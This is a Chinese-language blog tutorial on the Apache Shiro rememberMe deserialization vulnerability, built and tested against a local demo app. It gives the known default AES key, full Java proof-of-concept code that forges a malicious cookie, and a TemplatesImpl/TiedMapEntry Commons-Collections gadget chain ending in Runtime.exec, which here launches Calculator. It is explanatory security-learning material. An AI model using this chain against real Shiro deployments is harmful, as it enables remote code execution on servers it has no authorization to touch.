# [Java安全] Shiro反序列化CC链漏洞




 # 测试环境搭建

我这里用的是P牛的[JavaThings](https://github.com/phith0n/JavaThings)，这里有一个Maven构建的非常简易的Shiro的应用

这里用idea打开，然后构建Maven项目，构建好以后简历一个Tomcat服务器就可以使用了

![image-20221004093212167](https://tuchuang.huamang.xyz/img/image-20221004093212167.png)

直接访问localhost:8080

![image-20221004093230061](https://tuchuang.huamang.xyz/img/image-20221004093230061.png)

我找了好久没找到相关的登录代码逻辑，后来发现，这个项目根本没写，只是在shiro.ini文件里写了就够了

```java
[main]
shiro.loginUrl = /login.jsp

[users]
# format: username = password, role1, role2, ..., roleN
root = secret,admin
guest = guest,guest

[roles]
# format: roleName = permission1, permission2, ..., permissionN
admin = *

[urls]
# The /login.jsp is not restricted to authenticated users (otherwise no one could log in!), but
# the 'authc' filter must still be specified for it so it can process that url's
# login submissions. It is 'smart' enough to allow those requests through as specified by the
# shiro.loginUrl above.
/login.jsp = authc
/logout = logout
/** = user
```

我们用root/secret登录，勾选上rememberme，登录进去就可以看到有rememberMe的cookie了

![image-20221004100809578](https://tuchuang.huamang.xyz/img/image-20221004100809578.png)

# Shiro反序列化

## 简介

为了让浏览器或服务器重 启后用户不丢失登录状态，Shiro支持将持久化信息序列化并加密后保存在Cookie的rememberMe字 段中，下次读取时进行解密再反序列化。但是在Shiro 1.2.4版本之前内置了一个**默认且固定的加密 Key**，导致攻击者可以伪造任意的rememberMe Cookie，进而触发反序列化漏洞。

![image-20221004110620002](https://tuchuang.huamang.xyz/img/image-20221004110620002.png)

> 得到rememberMe的cookie值 --> Base64解码 --> AES解密 --> 反序列化



## 构建思路

那么这样的话，构造POC就非常简单了，只需要base64解码Shiro的key，然后对序列化数据进行AES加密即可得到exp

比如这个demo

```java
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.util.Base64;

public class attack1 {
    public static void main(String[] args) throws Exception {
        byte[] payload = new CommonsCollections6().getPayload("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource ciphertext = aes.encrypt(payload, key);
        System.out.printf(ciphertext.toString());
    }
}
```

但是这个payload是打不通的，报错了

![image-20221004133800889](https://tuchuang.huamang.xyz/img/image-20221004133800889.png)

具体原因是因为不能加载`Transformer[]`，细节原因不深入探究

总的来说就是：如果shiro反序列化流中包含**非Java自身的数组**，则会出现无法加载类的错误。这就 解释了为什么CommonsCollections6无法利用了，因为其中用到了Transformer数组。

那么我们如何构造才能避免使用Transformer数组呢，这就用到了前面学的TemplatesImpl

上一篇文章我们介绍CC3的时候，用到了TemplatesImpl和InvokerTransformer，但是还是需要用到Transformer数组的

![image-20221004115101904](https://tuchuang.huamang.xyz/img/image-20221004115101904.png)

这里有一篇博客介绍到了一个方法去绕过：[wh1s3p1g](https://www.anquanke.com/post/id/192619)

这里就涉及到了我们[CC6](https://blog.huamang.xyz/cc6/#cc6)的一个关键类`TiedMapEntry`

```java
public class TiedMapEntry implements Entry, KeyValue, Serializable {
    private static final long serialVersionUID = -8453869361373831205L;
    private final Map map;
    private final Object key;

    public TiedMapEntry(Map map, Object key) {
        this.map = map;
        this.key = key;
    }
		// ...
    public Object getValue() {
        return this.map.get(this.key);
    }
		// ...
    public int hashCode() {
        Object value = this.getValue();
        return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode());
    }
  	// ...
```

我们在分析CC6利用链的时候，我们关注的是`this.map.get(this.key);`里面map触发get方法，对于里面的key我们只是随便传了个值并没去管他

由于不能使用数组，所以`ChainedTransformer`就不能用了，那么这里我们自然也用不上`ConstantTransformer`了，那么我们就缺少了一个恶意对象和恶意对象参数的连接效果的东西了

而这里恰好，TiedMapEntry的getValue方法会传入key，如果Map是LazyMap的话，我们会惊喜的发现，key会直接传入，执行transform函数，这个效果就和`ConstantTransformer`一样的，作为一个恶意对象传递的功能，所以我们只需要把恶意对象传入作为key就可以了

![image-20221004123455407](https://tuchuang.huamang.xyz/img/image-20221004123455407.png)

## 构造POC

那么现在我们就来构造POC了，这里首先是参考前面的CC3利用TemplatesImpl去加载出一个恶意对象

```java
TemplatesImpl obj = new TemplatesImpl();
setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
setFieldValue(obj, "_name", "HelloTemplatesImpl");
setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
```

然后这里依然是用CC6的来接，构造faketransformer来防止构造时触发链子，但是和CC6的不一样，不能用ChainedTransformer了，所以得手动构造个无害transformer对象

```java
Transformer fakeTransformer = new ConstantTransformer(1);
```

然后就是加上CC6的链子了，具体看代码注释

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class attack2 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazzz = pool.get("EvilTest");
        byte[] code = clazzz.toBytecode();
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{code});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        // faketransformer防止构造时触发
        Transformer faketransformer = new InvokerTransformer("getClass", null, null);
        // CC6pro
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, faketransformer);
        // key传入恶意TemplatesImpl对象
        TiedMapEntry tme = new TiedMapEntry(outerMap,obj);
        HashMap expMap = new HashMap();
        expMap.put(tme,"value");
        outerMap.clear();
        //将faketransformer改造，iMethodName换成newTransformer触发链子
        setFieldValue(faketransformer, "iMethodName", "newTransformer");

        // 生成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(expMap);
        oos.close();

        // shiro数据生成
        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource ciphertext = aes.encrypt(barr.toByteArray(), key);
        System.out.printf(ciphertext.toString());
    }
}


```

最后我们再写个类去生成字节码去给TemplatesImpl加载

这里用到了`javassist`，这是一个字节码操纵的第三方库，可以帮助我将恶意类生成字节码再交给 TemplatesImpl

```
ClassPool pool = ClassPool.getDefault();
CtClass clazzz = pool.get("EvilTest");
byte[] code = clazzz.toBytecode();
```

然后再写一个恶意类，因为是要放入TemplatesImpl加载，所以得继承AbstractTranslet

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class EvilTest extends AbstractTranslet {
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    public EvilTest() throws IOException {
        super();
        Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
    }
}

```

然后运行拿到rememberMe，换上去刷新页面拿到flag**（要把JSESSIONID删掉！！！）**

![image-20221004193008262](https://tuchuang.huamang.xyz/img/image-20221004193008262.png)

# 总结

其实也没啥好说的，就是Shiro的key泄露造成的序列化数据的伪造，个人觉得Shiro太自负了，出现这种隐患不是去修改机制而还是从key的角度去防护，这让Shiro无论哪个版本，只要key泄露了，都会出现反序列化漏洞



然后值得一说的是，Shiro他因为不允许反序列化数组的原因，误打误撞的防御了ysoserial的CC链POC，关于这个的原因，详情可以参考这篇[博客](https://blog.zsxsoft.com/post/35)



最后我这次构造的POC其实挺曲折的，因为前面抱着侥幸的心里漏学了一些知识，导致都在这里还债了

最后总结一下shiro的CC利用链的构建思路

```
javassist生成恶意字节码 -> TemplatesImpl -> obj

构建faketransformer = new InvokerTransformer("getClass", null, null)

faketransformer ->  LazyMap.decorate() -> outMap

TiedMapEntry(outMap,obj) -> tme : 等待触发newTransformer

新建HashMap —> tmp -> expMap.put(tme,xxx) : 等待触发get进入CC6链子

把newTransformer插入iMethodName -> setFieldValue : faketransformer转为可用transformer，触发transform可调用newTransformer
```


